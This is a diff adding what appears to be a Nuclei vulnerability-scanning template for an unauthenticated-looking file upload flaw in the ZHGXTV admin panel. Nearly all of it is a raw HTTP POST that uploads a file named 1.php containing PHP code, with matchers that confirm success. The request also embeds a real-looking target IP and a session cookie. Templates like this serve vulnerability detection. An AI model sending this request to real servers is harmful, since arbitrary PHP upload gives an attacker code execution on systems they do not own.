@@ -1,0 +1,63 @@
+id: ZHGXTV-login-upload
+info:
+  name: ZHGXTV-login-upload
+  author: apple
+  severity: info
+  description: 后台洞。
+  reference:
+    - https://github.com/willchen0011/cve/blob/main/upload2.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /ZHGXTV/index.php/admin/index/web_upload_template.html HTTP/2
+        Host: {{Hostname}}
+        Content-Length: 874
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Accept: */*
+        Origin: http://118.77.61.149:888
+        Referer: http://118.77.61.149:888/ZHGXTV/index.php/admin/index/upload_templates.html
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: PHPSESSID=k9858i4ie8r50o8mhil3p9gklt
+
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Content-Disposition: form-data; name="folder"
+
+        upload_template
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Content-Disposition: form-data; name="id"
+
+        WU_FILE_0
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Content-Disposition: form-data; name="name"
+
+        1.php
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Content-Disposition: form-data; name="type"
+
+        application/octet-stream
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Content-Disposition: form-data; name="lastModifiedDate"
+
+        Wed Jul 12 2023 10:10:53 GMT+0800 (中国标准时间)
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Content-Disposition: form-data; name="size"
+        21
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3
+        Content-Disposition: form-data; name="file"; filename="1.php"
+        Content-Type: application/octet-stream
+
+        <?php phpinfo();?>
+        ------WebKitFormBoundaryZzN3aF71HnOAXhI3--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'success'
+      - type: word
+        part: body
+        words:
+          - .php
